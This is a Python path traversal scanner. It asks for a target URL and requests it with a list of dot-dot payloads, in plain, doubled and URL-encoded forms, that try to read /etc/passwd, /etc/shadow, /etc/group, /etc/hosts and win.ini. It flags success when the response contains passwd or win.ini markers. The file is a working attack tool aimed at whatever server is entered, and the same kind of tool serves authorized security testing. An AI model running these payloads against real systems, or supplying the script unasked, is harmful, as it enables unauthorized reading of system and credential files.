import requests
from urllib.parse import urljoin

# Extensive list of common path traversal payloads
payloads = [
    "../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/group",
    "../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../windows/win.ini",
    "../../../../../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../../etc/group",
    "../../../../../../../../../../../../../../etc/hosts",
    "../" * 10 + "etc/passwd",
    "../" * 10 + "windows/win.ini",
    "../" * 10 + "etc/shadow",
    "../" * 10 + "etc/group",
    "../" * 10 + "etc/hosts",
    "....//....//....//....//....//....//etc/passwd",
    "....//....//....//....//....//....//windows/win.ini",
    "....//....//....//....//....//....//etc/shadow",
    "....//....//....//....//....//....//etc/group",
    "....//....//....//....//....//....//etc/hosts",
    "%2e%2e%2f" * 10 + "etc/passwd",
    "%2e%2e%2f" * 10 + "windows/win.ini",
    "%2e%2e%2f" * 10 + "etc/shadow",
    "%2e%2e%2f" * 10 + "etc/group",
    "%2e%2e%2f" * 10 + "etc/hosts",
]

# Function to check for path traversal vulnerability
def check_path_traversal(url):
    for payload in payloads:
        # Construct the full URL
        test_url = urljoin(url, payload)
        print(f"Testing URL: {test_url}")

        try:
            response = requests.get(test_url, timeout=5)
            # Check for common indicators of path traversal vulnerability
            if "root:" in response.text or "[extensions]" in response.text or "daemon:" in response.text:
                print(f"Path traversal vulnerability found with payload: {payload}")
                return True, payload
        except requests.exceptions.RequestException as e:
            print(f"Error testing URL: {test_url} - {e}")
    
    return False, None

# Function to scan a given website URL
def scan_website(url):
    print(f"Starting scan on: {url}")
    is_vulnerable, payload = check_path_traversal(url)
    if is_vulnerable:
        print(f"Path traversal vulnerability detected on: {url} with payload: {payload}")
        return True, f"Path traversal vulnerability detected with payload: {payload}"
    else:
        print(f"No path traversal vulnerabilities detected on: {url}")
        return False, "No path traversal vulnerabilities detected"

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    scan_website(target_url)
